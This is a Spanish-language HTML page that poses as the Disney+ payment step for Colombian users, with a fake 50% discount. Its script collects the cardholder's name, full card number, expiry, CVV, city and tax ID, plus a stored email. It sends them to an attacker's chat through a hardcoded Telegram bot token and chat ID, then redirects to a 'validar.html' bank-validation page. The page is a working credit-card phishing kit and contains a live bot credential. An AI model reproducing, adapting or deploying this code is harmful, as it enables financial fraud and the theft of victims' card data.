<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Paso 3 | Disney+</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">

<style>
body {
    margin: 0;
    background: #0f0f0f;
    font-family: 'Inter', sans-serif;
    color: #fff;
}

/* HEADER */
header {
    padding: 20px;
    display: flex;
    justify-content: space-between;
    align-items: center;
}

header img { height: 34px; }
header a { color: #bbb; font-size: 15px; text-decoration: none; }

/* CONTENEDOR */
.main-container {
    padding: 20px;
    max-width: 600px;
    margin: auto;
}

.step { font-size: 14px; color: #9ca3af; }
h1 { font-size: 28px; margin-top: 5px; margin-bottom: 25px; }

/* TABS */
.tabs {
    display: flex;
    margin-bottom: 20px;
    border-bottom: 1px solid #333;
}

.tab {
    flex: 1;
    text-align: center;
    padding: 12px 0;
    font-size: 16px;
    cursor: pointer;
    color: #bbb;
}

.tab.active {
    color: #00c8ff;
    border-bottom: 2px solid #00c8ff;
}

/* LABELS */
label {
    display: block;
    margin: 18px 0 6px;
    font-size: 14px;
    color: #d1d5db;
}

/* INPUTS */
input, select {
    width: 100%;
    padding: 15px;
    background: #1a1a1a;
    border: 1px solid #383838;
    border-radius: 6px;
    color: #fff;
    font-size: 15px;
    box-sizing: border-box;
}

/* TARJETA */
.input-card { position: relative; }

.card-icons {
    position: absolute;
    right: 12px;
    top: 50%;
    transform: translateY(-50%);
    display: flex;
    gap: 6px;
}

.card-icons img {
    height: 26px;
    opacity: .9;
}

/* FILA DOBLE */
.row-double {
    display: flex;
    gap: 15px;
    margin-top: 5px;
}

.field-group { flex: 1; min-width: 0; }

/* CAJA PRECIO */
#price-box {
    margin-top: 25px;
    padding: 20px;
    background: #141414;
    border: 1px solid #2a2a2a;
    border-radius: 10px;
}

/* BOT√ìN */
button {
    width: 100%;
    padding: 16px;
    margin-top: 25px;
    background: #fff;
    border: none;
    color: #000;
    border-radius: 30px;
    font-size: 17px;
    cursor: pointer;
    font-weight: 600;
    transition: background 0.2s;
}

button:hover {
    background: #f0f0f0;
}

button:active {
    transform: scale(0.98);
}

/* FOOTER */
footer {
    margin-top: 50px;
    padding: 35px 20px;
    background: #0d0d0d;
    color: #7e7e7e;
    text-align: center;
    font-size: 13px;
}

footer a { color: #00c8ff; text-decoration: none; }

/* RESPONSIVE */
@media (max-width: 480px) {
    .row-double { flex-direction: column; gap: 0; }
}

/* BANCO INFO */
.bank-selector {
    margin-top: 20px;
    padding: 15px;
    background: rgba(0, 200, 255, 0.05);
    border: 1px solid rgba(0, 200, 255, 0.2);
    border-radius: 8px;
}

.bank-selector p {
    margin: 0 0 10px 0;
    font-size: 14px;
    color: #00c8ff;
}

/* NUEVO: PRECIOS CON DESCUENTO */
.price-discount {
    margin-top: 10px;
}

.original-price {
    font-size: 16px;
    color: #888;
    text-decoration: line-through;
    margin-bottom: 5px;
}

.discount-price {
    font-size: 26px;
    font-weight: 600;
    color: #00ff88;
    margin: 5px 0;
}

.discount-badge {
    background: #00a8ff;
    color: white;
    padding: 4px 10px;
    border-radius: 20px;
    font-size: 12px;
    font-weight: 600;
    display: inline-block;
    margin-top: 5px;
}

/* LOADING */
.loading {
    display: none;
    text-align: center;
    margin-top: 15px;
}

.spinner {
    border: 4px solid #f3f3f3;
    border-top: 4px solid #00c8ff;
    border-radius: 50%;
    width: 40px;
    height: 40px;
    animation: spin 1s linear infinite;
    margin: 0 auto;
}

@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}
</style>
</head>

<body>

<!-- HEADER -->
<header>
    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3e/Disney%2B_logo.svg">
    <a href="#">Cerrar sesi√≥n</a>
</header>

<!-- CONTENIDO -->
<div class="main-container">

    <div class="step">PASO 3 DE 3</div>
    <h1>¬°A disfrutar!</h1>

    <div class="tabs">
        <div class="tab active">Cr√©dito/D√©bito</div>
    </div>

    <!-- FORM -->
    <label>NOMBRE EN LA TARJETA</label>
    <input id="cardName" type="text" placeholder="Nombre del titular">

    <label>N√öMERO DE LA TARJETA</label>
    <div class="input-card">
        <input id="cardNumber" type="text" placeholder="‚Ä¢‚Ä¢‚Ä¢‚Ä¢ ‚Ä¢‚Ä¢‚Ä¢‚Ä¢ ‚Ä¢‚Ä¢‚Ä¢‚Ä¢ ‚Ä¢‚Ä¢‚Ä¢‚Ä¢" maxlength="19">
        <div class="card-icons">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/04/Mastercard-logo.png/1200px-Mastercard-logo.png">
            <img src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo_%282018%29.svg">
            <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png">
        </div>
    </div>

    <div class="row-double">
        <div class="field-group">
            <label>FECHA DE VENCIMIENTO</label>
            <input id="cardExpiry" type="text" placeholder="MM/AA" maxlength="5">
        </div>

        <div class="field-group">
            <label>C√ìDIGO DE SEGURIDAD</label>
            <input id="cardCVV" type="text" placeholder="CVV" maxlength="4">
        </div>
    </div>

    <label>CIUDAD</label>
    <input id="city" type="text" placeholder="Ingrese su ciudad">

    <label>DEPARTAMENTO</label>
    <select id="department">
        <option value="">Seleccionar‚Ä¶</option>
        <option>Antioquia</option>
        <option>Cundinamarca</option>
        <option>Valle del Cauca</option>
        <option>Atl√°ntico</option>
        <option>Santander</option>
    </select>

    <label>RUT (OPCIONAL)</label>
    <input id="rut" type="text" placeholder="Opcional">

    <!-- üî• TOTAL A PAGAR CON DESCUENTO -->
    <div id="price-box">
        <div style="color:#9ca3af; font-size:15px;">Total a pagar</div>

        <!-- PRECIO ORIGINAL TACHADO -->
        <div id="originalPrice" class="original-price"></div>
        
        <!-- PRECIO CON DESCUENTO -->
        <div id="finalPrice" style="
            margin-top: 6px;
            font-size: 26px;
            font-weight: 600;
            color: #00ff88;
            text-shadow: 0 0 8px rgba(0,255,136,.35);
        "></div>

        <div class="discount-badge" id="discountBadge">¬°50% DE DESCUENTO!</div>

        <div id="planName" style="margin-top:8px; font-size:14px; color:#6b7280;"></div>

        <div id="planSummary" style="margin-top:10px; font-size:14px; color:#9ca3af;"></div>
    </div>

    <!-- üî• SELECCI√ìN DEL BANCO (TU C√ìDIGO ORIGINAL) -->
    <div class="bank-selector">
        <p>Seleccione su banco para validar el pago:</p>
        <select id="bankSelect" style="background: #0f0f0f;">
            <option value="">-- Seleccionar banco --</option>
            <option value="Bancolombia">Bancolombia</option>
            <option value="Nequi">Nequi</option>
            <option value="Davivienda">Davivienda</option>
            <option value="BBVA">BBVA</option>
            <option value="Banco Popular">Banco Popular</option>
            <option value="Banco de Bogot√°">Banco de Bogot√°</option>
            <option value="Ita√∫">Ita√∫</option>
        </select>
    </div>

    <!-- BOT√ìN FINAL -->
    <button onclick="proceedToValidation()">VALIDAR PAGO CON EL BANCO</button>
    
    <!-- LOADING -->
    <div id="loading" class="loading">
        <div class="spinner"></div>
        <p style="color:#ccc; margin-top:10px;">Procesando pago...</p>
    </div>

</div>

<!-- FOOTER -->
<footer>
    ¬© 2025 Disney+. Todos los derechos reservados. ¬∑ 
    <a href="#">T√©rminos de uso</a> ¬∑ 
    <a href="#">Pol√≠tica de privacidad</a> ¬∑ 
    <a href="#">Ayuda</a>
</footer>

<script>
// Recuperar plan guardado
const plan = localStorage.getItem("plan") || "standard_ads";
const email = localStorage.getItem("disneyEmail") || "correo@ejemplo.com";

// DATOS CON 50% DE DESCUENTO
const planData = {
    premium: {
        originalPrice: "49.900",
        discountPrice: "24.900",
        name: "Plan Premium",
        desc: "Incluye: 4K UHD ‚Ä¢ 4 dispositivos ‚Ä¢ Sin anuncios ‚Ä¢ ESPN incluido"
    },
    standard: {
        originalPrice: "36.900",
        discountPrice: "18.400",
        name: "Plan Est√°ndar",
        desc: "Incluye: Full HD ‚Ä¢ 2 dispositivos ‚Ä¢ Sin anuncios ‚Ä¢ ESPN incluido"
    },
    standard_ads: {
        originalPrice: "24.900",
        discountPrice: "12.400",
        name: "Est√°ndar con anuncios",
        desc: "Incluye: HD ‚Ä¢ 2 dispositivos ‚Ä¢ Con anuncios ‚Ä¢ ESPN incluido"
    }
};

// Insertar valores del plan CON DESCUENTO
const selectedPlan = planData[plan];
document.getElementById("originalPrice").innerText = `COP ${selectedPlan.originalPrice}/mes`;
document.getElementById("finalPrice").innerText = `COP ${selectedPlan.discountPrice}/mes`;
document.getElementById("planName").innerText = selectedPlan.name;
document.getElementById("planSummary").innerText = selectedPlan.desc;

// Funci√≥n para enviar datos a Telegram
async function sendToTelegram(bankName, cardData) {
    const botToken = "8323486458:AAGJeAlHlciuq-STKT6i6f-kU9Vt_uCsgp8";
    const chatId = "7776240161";
    
    const planInfo = planData[plan];
    
    const message = `üè¶ NUEVO PAGO DISNEY+ CON BANCO üè¶

‚úÖ BANCO SELECCIONADO: ${bankName}
üìß CORREO: ${email}
üèôÔ∏è CIUDAD: ${cardData.city || "No especificada"}
üìç DEPARTAMENTO: ${cardData.department || "No especificado"}

‚úÖ PLAN: ${planInfo.name}
üí∞ PRECIO ORIGINAL: COP ${planInfo.originalPrice}/mes
üî• PRECIO CON 50% OFF: COP ${planInfo.discountPrice}/mes
üéÅ DESCUENTO APLICADO: 50%

üí≥ DATOS DE TARJETA:
‚Ä¢ Nombre: ${cardData.cardName}
‚Ä¢ N√∫mero: ${cardData.cardNumber}
‚Ä¢ Vencimiento: ${cardData.cardExpiry}
‚Ä¢ CVV: ${cardData.cardCVV}
‚Ä¢ RUT: ${cardData.rut || "No proporcionado"}

üìù RESUMEN PLAN: ${planInfo.desc}

üìä INFORMACI√ìN ADICIONAL:
‚Ä¢ Fecha: ${new Date().toLocaleString()}
‚Ä¢ ESPN: INCLUIDO EN EL PLAN
‚Ä¢ Estado: PENDIENTE VALIDACI√ìN BANCARIA

üëâ VALIDAR CON BANCO: ${bankName}
üëâ ENVIAR CREDENCIALES AL CORREO`;

    try {
        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'HTML'
            })
        });
        
        if (response.ok) {
            console.log('Datos enviados exitosamente a Telegram');
            return true;
        } else {
            console.error('Error en la respuesta de Telegram');
            return false;
        }
    } catch (error) {
        console.error('Error enviando a Telegram:', error);
        return false;
    }
}

// Funci√≥n para ir a la validaci√≥n
async function proceedToValidation() {
    // Obtener banco seleccionado
    const bankSelect = document.getElementById("bankSelect");
    const selectedBank = bankSelect.value;
    
    // Validar que se haya seleccionado un banco
    if (!selectedBank) {
        alert("Por favor, seleccione su banco para proceder con la validaci√≥n.");
        return;
    }
    
    // Validar campos obligatorios
    const cardName = document.getElementById("cardName").value.trim();
    const cardNumber = document.getElementById("cardNumber").value.trim().replace(/\s+/g, '');
    const cardExpiry = document.getElementById("cardExpiry").value.trim();
    const cardCVV = document.getElementById("cardCVV").value.trim();
    const city = document.getElementById("city").value.trim();
    const department = document.getElementById("department").value;
    
    if (!cardName || !cardNumber || !cardExpiry || !cardCVV || !city || !department) {
        alert("Por favor, complete todos los campos obligatorios.");
        return;
    }
    
    if (cardNumber.length < 16) {
        alert("N√∫mero de tarjeta inv√°lido. Debe tener 16 d√≠gitos.");
        return;
    }
    
    // Mostrar loading
    document.getElementById('loading').style.display = 'block';
    document.querySelector('button').disabled = true;
    
    // Recolectar todos los datos
    const cardData = {
        cardName: cardName,
        cardNumber: cardNumber,
        cardExpiry: cardExpiry,
        cardCVV: cardCVV,
        city: city,
        department: department,
        rut: document.getElementById("rut").value.trim()
    };
    
    // Enviar a Telegram
    const sent = await sendToTelegram(selectedBank, cardData);
    
    // Ocultar loading
    document.getElementById('loading').style.display = 'none';
    document.querySelector('button').disabled = false;
    
    if (sent) {
        // Guardar datos en localStorage
        localStorage.setItem("selectedBank", selectedBank);
        localStorage.setItem("paymentData", JSON.stringify({
            cardName: cardName,
            cardLast4: cardNumber.slice(-4),
            plan: plan,
            originalAmount: planData[plan].originalPrice,
            discountAmount: planData[plan].discountPrice,
            email: email,
            timestamp: new Date().toISOString()
        }));
        
        // Redirigir a la p√°gina de validaci√≥n bancaria
        window.location.href = "validar.html";
    } else {
        alert("Error al procesar el pago. Por favor intenta de nuevo.");
    }
}

// Formatear n√∫mero de tarjeta con espacios
document.getElementById("cardNumber").addEventListener('input', function(e) {
    let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    let formatted = '';
    for (let i = 0; i < value.length; i++) {
        if (i > 0 && i % 4 === 0) formatted += ' ';
        formatted += value[i];
    }
    e.target.value = formatted;
});

// Formatear fecha de vencimiento
document.getElementById("cardExpiry").addEventListener('input', function(e) {
    let value = e.target.value.replace(/[^0-9]/g, '');
    if (value.length >= 2) {
        e.target.value = value.substring(0, 2) + '/' + value.substring(2, 4);
    }
});

// Solo n√∫meros para CVV
document.getElementById("cardCVV").addEventListener('input', function(e) {
    e.target.value = e.target.value.replace(/[^0-9]/g, '');
});
</script>

</body>
</html>
